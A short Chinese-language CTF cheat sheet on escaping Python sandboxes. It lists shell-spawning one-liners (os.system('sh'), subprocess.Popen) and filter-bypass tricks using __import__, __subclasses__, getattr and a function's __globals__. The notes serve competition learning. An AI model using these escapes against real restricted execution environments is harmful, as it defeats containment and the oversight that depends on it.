# Python Sanbox Challenge in CTF

Python Sandbox 的題目通常都是可以讓我們執行 python 的程式碼，但是會有各種檢查

### 目標

**Get shell**

```python
import os
os.system("sh")
```

```python
import subprocess
subprocess.Popen(["sh"])
```

```python
import sys
sys.modules["os"].system("sh")
```

### 小技巧

#### `__import__`

`import` 其實是去呼叫 `__import__`

```python
__import__("os").system("sh")
```

#### 拉圾堆

可以從這些地方找可以用的東西

```python
globals()
locals()
{}.__class__.__base__.__subclasses__()
{}.__class__.__mro__[1].__subclasses__()
```

#### `getattr`

`.` 可以用 `getattr` 取代

```python
os.system("sh")
getattr(os, "system")("sh")
```

#### 共享視野

當我們有一個檔案 `test.py` 長這樣

```python
import os

def test():
    print("test")
```

我們可以跟 `test` 函式共享視野

```python
from test import test
test.__globals__["os"].system("sh")
test.__globals__["__builtins__"]["__import__"]("os").system("ls")
```

### 各種底線是什麼

#### `__builtins__`

會自動載入為全域變數，包括各種內建函式 ( ex: `print`, `dir`, ... )

```python
__builtins__ = __import__("__builtin__") # python2
__builtins__ = __import__("builtins")    # python3
```
